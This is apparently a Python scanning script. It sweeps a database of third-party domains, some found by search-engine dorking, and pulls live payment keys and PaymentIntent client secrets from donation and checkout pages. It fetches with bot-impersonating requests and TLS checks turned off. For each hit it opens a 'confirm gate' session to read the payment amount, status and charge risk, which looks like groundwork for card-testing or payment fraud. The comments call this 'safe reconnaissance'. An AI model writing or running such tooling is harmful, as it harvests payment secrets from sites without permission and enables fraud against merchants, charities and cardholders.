# language: Python 3.12+, file: scratch/_probe_targets_secrets.py, target: Windows 11
# Sprint 3 live verification: sweep db domains for exposed pk_live / client_secret /
# mint endpoints. Retrieve-only on hits (no confirm) — безопасная разведка.
import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from curl_cffi.requests import AsyncSession

import domains_store
import gate_client as gc
from confirm_gate import ConfirmGateSession

PATHS = ["/", "/donate", "/donation", "/checkout", "/give/donation-form/"]


async def sweep(domains: list[str]):
    hits = []
    sem = asyncio.Semaphore(12)

    async def one(dom: str):
        async with sem:
            base = f"https://{dom}"
            for path in PATHS:
                try:
                    async with AsyncSession(impersonate="chrome131", verify=False) as s:
                        r = await s.get(base + path, timeout=8)
                    if r.status_code != 200 or gc.is_cloudflare_challenge(r.text):
                        continue
                    pk = gc.extract_pk_live(r.text)
                    secs = gc.extract_client_secrets(r.text)
                    mints = gc.detect_secret_mints(r.text, base + path)
                    if pk and (secs or mints):
                        print(f"  [HIT] {dom}{path} | pk={pk[:22]}... secrets={len(secs)} mints={len(mints)}")
                        hits.append({"dom": dom, "url": base + path,
                                     "secrets": [x["secret"] for x in secs], "mints": mints})
                        break
                except Exception:
                    continue

    await asyncio.gather(*[one(d) for d in domains])
    return hits


async def main():
    rows = domains_store.all_domains()
    # приоритетные (1-2) целиком + выборка dork-хвоста; полный пул по флагу --all
    if "--all" in sys.argv:
        doms = [r["domain"] for r in rows]
    else:
        prio = [r["domain"] for r in rows if r["priority"] <= 2]
        tail = [r["domain"] for r in rows if r["priority"] > 2][:120]
        doms = prio + tail
    print(f"[*] Sweeping {len(doms)} db domains x {len(PATHS)} paths for exposed PI material...")
    hits = await sweep(doms)
    print(f"[+] {len(hits)} target(s) with live PI surface")

    for h in hits:
        if h["secrets"]:
            # retrieve-only разведка: сумма, статус, capture_method
            gs = ConfirmGateSession(h["url"])
            ok, detail = await gs.open()
            await gs.close()
            state = "OPEN-OK" if ok else f"open-failed ({detail})"
            risk = "CHARGE_RISK" if gs.charge_risk else "$0-safe"
            print(f"  [PI] {h['dom']}: {state} | amount={gs.pi_info['amount'] if gs.pi_info else '?'} "
                  f"{gs.pi_info['currency'] if gs.pi_info else ''} status={gs.pi_info['status'] if gs.pi_info else '?'} [{risk}]")


if __name__ == "__main__":
    asyncio.run(main())
